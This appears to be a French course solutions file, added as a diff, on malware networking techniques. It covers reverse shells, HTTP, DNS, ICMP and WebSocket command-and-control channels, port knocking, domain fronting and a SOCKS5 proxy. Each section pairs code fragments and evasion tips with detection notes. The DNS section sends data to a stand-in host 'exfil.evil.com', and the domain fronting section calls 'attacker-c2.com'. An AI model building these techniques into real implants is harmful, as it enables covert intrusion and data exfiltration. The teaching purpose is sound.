@@ -1,0 +1,188 @@
+SOLUTIONS - MODULE 27 : NETWORKING & SOCKETS
+
+⚠️ AVERTISSEMENT : Code malware conceptuel. Comprendre pour défendre.
+
+SOLUTION 1 : REVERSE SHELL TCP ROBUSTE
+
+Points clés :
+- Backoff exponentiel : delay *= 2 après chaque échec (3s, 6s, 12s, max 60s)
+- Jitter : delay += rand() % 5000 pour randomisation
+- Socket keep-alive : setsockopt SO_KEEPALIVE
+- Windows : CreateProcessA avec STARTUPINFO.hStd* = socket
+- Linux : dup2(sock, 0/1/2) puis execve("/bin/sh", ...)
+
+Architecture :
+1. Boucle while(attempts < max_attempts)
+2. connect() avec timeout
+3. Si échec : sleep(backoff_delay + jitter), retry
+4. Si succès : spawn shell avec I/O redirigé
+5. Sur déconnexion : restart boucle
+
+Détection : Sysmon Event ID 3 (connexions sortantes), Zeek conn.log
+
+
+SOLUTION 2 : HTTP/HTTPS C2 BEACON
+
+Headers légitimes :
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+Accept: text/html,application/json
+Accept-Language: en-US,en;q=0.9
+Accept-Encoding: gzip, deflate
+Connection: keep-alive
+
+URI patterns RESTful :
+/api/v1/status?id={uuid}
+/api/v2/users/{id}/profile
+/analytics/events
+
+Jitter : interval * (0.7 + rand()/RAND_MAX * 0.6)  // +/- 30%
+
+Commandes encodées dans response :
+- JSON : {"status":"ok","cmd":"d2hvYW1p"}  // base64(whoami)
+- Cookie : Set-Cookie: session=base64_cmd
+- Custom header : X-Request-ID: encoded_cmd
+
+Détection : Beaconing pattern (fixed intervals), entropy analysis HTTP
+
+
+SOLUTION 3 : DNS TUNNELING EXFILTRATION
+
+Encoding Base32 (préféré car case-insensitive) :
+char b32[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";
+
+```c
+// data "hello" -> "NBSWY3DP"
+```
+
+Chunking :
+for(i=0; i<len; i+=60) {
+    snprintf(query, 256, "seq%d.%.60s.exfil.evil.com", seq++, encoded+i);
+    res_query(query, C_IN, T_TXT, ...);
+}
+
+Serveur DNS (Python + dnslib) :
+- Parser subdomains
+- Décoder base32
+- Reconstruire séquence
+- Renvoyer commande dans TXT record
+
+Rate limiting : max 10 queries/min pour éviter détection
+
+Détection : Long subdomains, high entropy, high query volume
+
+
+SOLUTION 4 : ICMP TUNNELING
+
+Structure paquet ICMP Echo :
+struct icmp_packet {
+    uint8_t type;      // 8 = Echo Request
+    uint8_t code;      // 0
+    uint16_t checksum;
+    uint16_t id;
+    uint16_t sequence;
+    char data[64];     // Notre payload ici
+};
+
+Checksum :
+uint16_t checksum(uint16_t *buf, int len) {
+    uint32_t sum = 0;
+    while(len > 1) { sum += *buf++; len -= 2; }
+    if(len) sum += *(uint8_t*)buf;
+    sum = (sum >> 16) + (sum & 0xFFFF);
+    return ~sum;
+}
+
+Envoi : sendto(raw_sock, &packet, sizeof(packet), 0, ...)
+
+Détection : ICMP avec payload data (normal ping = empty)
+
+
+SOLUTION 5 : PORT KNOCKING
+
+État machine :
+int knock_state = 0;
+int knock_sequence[] = {7000, 8000, 9000};
+
+for each packet received:
+    if (src_port == knock_sequence[knock_state])
+        knock_state++
+    else
+        knock_state = 0
+
+    if (knock_state == 3)
+        open_c2_port()
+        start_timeout_timer(30s)
+
+Implémentation : raw sockets ou libpcap pour sniff
+
+Détection : Difficile, analyzer connexions avant port opening
+
+
+SOLUTION 6 : DOMAIN FRONTING
+
+Concept :
+sock = connect_to("legitimate-cdn.com:443");  // Cloudflare, Azure CDN
+SSL_connect(sock);
+request = "GET /c2 HTTP/1.1\r\n"
+          "Host: attacker-c2.com\r\n"  // CDN route basé sur Host
+          "...\r\n\r\n";
+
+CDN voit : connexion vers legitimate-cdn.com (whitelisted)
+CDN route vers : attacker-c2.com (basé sur Host header)
+
+Firewall/IPS bypass car inspection voit seulement SNI = legitimate domain
+
+Détection : Host header != SNI, mais nécessite SSL inspection
+
+
+SOLUTION 7 : WEBSOCKET C2
+
+Handshake HTTP :
+GET /socket HTTP/1.1
+Host: c2.com
+Upgrade: websocket
+Connection: Upgrade
+Sec-WebSocket-Key: base64_random
+Sec-WebSocket-Version: 13
+
+Response :
+HTTP/1.1 101 Switching Protocols
+Upgrade: websocket
+Sec-WebSocket-Accept: hash(key + magic_string)
+
+Framing :
+[FIN|RSV|OPCODE|MASK|LEN|MASK_KEY|PAYLOAD]
+- Opcode : 1=text, 2=binary, 8=close, 9=ping
+- Client MUST mask payload
+
+Heartbeat : send PING frame chaque 30s
+
+Détection : WebSocket upgrade, mais blend in web traffic
+
+
+SOLUTION 8 : SOCKS5 PROXY
+
+Handshake :
+Client -> [0x05, 0x01, 0x00]  // version, nmethods, no auth
+Server -> [0x05, 0x00]         // version, method=no auth
+
+Request :
+Client -> [0x05, 0x01, 0x00, 0x01, IP(4), PORT(2)]  // CONNECT
+Server -> [0x05, 0x00, ...]    // Success
+
+Relay :
+while(1) {
+    select(client_sock, target_sock, ...)
+    if client readable: relay(client -> target)
+    if target readable: relay(target -> client)
+}
+
+Détection : SOCKS handshake signatures, proxy behavior
+
+RÉFÉRENCES COMPLÈTES :
+- Metasploit Framework : modules payloads/reverse_tcp
+- Cobalt Strike : malleable C2 profiles documentation
+- DNSCat2, Iodine : DNS tunneling opensource
+- ptunnel : ICMP tunneling reference
+- RFC 1928 : SOCKS5 specification
+
